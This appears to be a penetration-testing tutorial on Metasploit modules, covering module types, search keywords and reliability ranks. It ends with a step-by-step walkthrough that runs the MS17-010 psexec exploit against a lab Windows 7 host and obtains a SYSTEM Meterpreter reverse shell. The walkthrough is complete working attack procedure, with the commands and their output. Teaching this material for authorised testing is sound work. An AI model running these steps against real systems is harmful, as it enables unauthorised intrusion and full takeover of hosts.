# Modules

Metasploit modules are self-contained Ruby scripts with a defined purpose, a structured set of configurable options, and embedded metadata that describes the vulnerability, affected targets, and reliability of the exploit. Each module in the library has been developed and tested against real environments before being integrated into the framework. An important distinction to maintain is that a failed exploit module does not disprove the existence of the underlying vulnerability; it may simply mean the module requires customisation for the specific target configuration. Metasploit is a support tool, not a substitute for manual verification.

## Module Naming Convention

Every module follows a consistent path structure that encodes its type, target platform, affected service, and specific action:

```
<No.> <type>/<os>/<service>/<name>

794   exploit/windows/ftp/scriptftp_list
```

The index number assigned during a search allows direct selection with `use <No.>` rather than typing the full path, which is especially useful when working through long result lists.

## Module Types

| Type | Purpose |
|---|---|
| **Auxiliary** | Scanning, fuzzing, sniffing, credential testing, and administrative tasks; does not deliver a payload |
| **Encoders** | Transform payloads to reduce detection by static signature-based AV engines and NIDS |
| **Exploits** | Contain the attack logic for a specific vulnerability and deliver a payload upon success |
| **NOPs** | Insert no-operation bytes to pad payloads to consistent sizes, primarily used in buffer overflow exploits |
| **Payloads** | The code executed on the target after a successful exploit; establishes a shell or Meterpreter session |
| **Evasion** | Modules designed specifically to bypass endpoint protection products such as Windows Defender |
| **Post** | Run against established sessions to gather information, escalate privileges, pivot, or maintain access |

Only three module types function as initiators and can be loaded with the `use` command to begin an interaction: **Auxiliary**, **Exploits**, and **Post**. Encoders, NOPs, payloads, and plugins are consumed by or configured alongside these types rather than selected as standalone initiators.

## Searching for Modules

The `search` command supports a rich keyword syntax that enables precise filtering across the full module library. Prepending a value with `-` excludes matching results:

```bash
# Search by exploit family name
search eternalromance

# Narrow to exploit modules only
search eternalromance type:exploit

# Filter by year, platform, rank, and name pattern together
search type:exploit platform:windows cve:2021 rank:excellent microsoft
```

Available search keywords:

| Keyword | Function |
|---|---|
| `type:` | Filter by module type (exploit, auxiliary, post, payload, encoder, evasion, nop) |
| `platform:` | Filter by target OS (windows, linux, osx, android) |
| `cve:` | Match by CVE ID or year |
| `rank:` | Filter by reliability rank (excellent, great, good, normal, average, low) |
| `name:` | Match against module name |
| `author:` | Filter by module author |
| `edb:` | Match by Exploit-DB entry ID |
| `port:` | Filter by target service port |

## Module Reliability Ranks

Exploit modules carry a rank that reflects expected reliability under normal conditions:

```
excellent > great > good > normal > average > low > manual
```

Modules ranked `excellent` are expected not to crash the target service. Modules ranked `average` or below may cause instability and should be used cautiously, particularly against production systems.

## Walkthrough: MS17-010 on Windows 7

The following end-to-end example covers module selection, configuration, and execution against a Windows 7 host with SMB exposed on port 445.

**Step 1: Enumerate the target**

```bash
nmap -sV 10.10.10.40

PORT      STATE SERVICE      VERSION
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
Service Info: Host: HARIS-PC; OS: Windows
```

**Step 2: Search for the relevant module**

```bash
msf6 > search ms17_010

#  Name                                      Rank     Check  Description
-  ----                                      ----     -----  -----------
0  exploit/windows/smb/ms17_010_eternalblue  average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
1  exploit/windows/smb/ms17_010_psexec       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
2  auxiliary/admin/smb/ms17_010_command      normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
3  auxiliary/scanner/smb/smb_ms17_010        normal   No     MS17-010 SMB RCE Detection
```

The `ms17_010_psexec` module ranks `normal` and uses the EternalRomance, EternalSynergy, and EternalChampion exploit chain. It is more reliable than the base EternalBlue module against Windows 7 and Server 2016 targets because it exploits a type confusion and race condition vulnerability in SMB transaction processing and requires only a named pipe rather than a kernel pool corruption primitive.

**Step 3: Load the module and review options**

```bash
msf6 > use 1
msf6 exploit(windows/smb/ms17_010_psexec) > options
```

All fields marked `Required: yes` must be populated before execution. The `LHOST` field for the reverse TCP payload has no default and must always be set explicitly.

**Step 4: Configure options**

Use `set` for session-scoped values and `setg` for global values that should persist across module changes within the same console session:

```bash
msf6 exploit(windows/smb/ms17_010_psexec) > setg RHOSTS 10.10.10.40
msf6 exploit(windows/smb/ms17_010_psexec) > setg LHOST 10.10.14.15
```

`setg` assignments persist until the console is closed or the value is explicitly unset with `unsetg`. Use `setg` for LHOST and LPORT when working repeatedly against multiple targets from the same attack machine within a single session.

**Step 5: Inspect the module in detail**

```bash
msf6 exploit(windows/smb/ms17_010_psexec) > info
```

The `info` command displays the full module description, list of CVEs, available execution targets (Automatic, PowerShell, Native upload, MOF upload), required options, payload space, and author attribution. Review this before executing against any target to confirm the module is appropriate and to understand exactly what it will do on the system.

**Step 6: Execute**

```bash
msf6 exploit(windows/smb/ms17_010_psexec) > run

[+] 10.10.10.40:445 - Host is likely VULNERABLE to MS17-010!
[+] 10.10.10.40:445 - SYSTEM session obtained!
[*] Meterpreter session 1 opened (10.10.14.15:4444 -> 10.10.10.40:49158)

meterpreter > shell

C:\Windows\system32> whoami
nt authority\system
```

The exploit runs the built-in auxiliary scanner to confirm vulnerability before attempting exploitation, then completes the EternalRomance chain and opens a Meterpreter session running as `NT AUTHORITY\SYSTEM`. No manual payload selection, encoding, or session pivoting was required for this example; the default payload configuration was sufficient to demonstrate the complete module workflow.
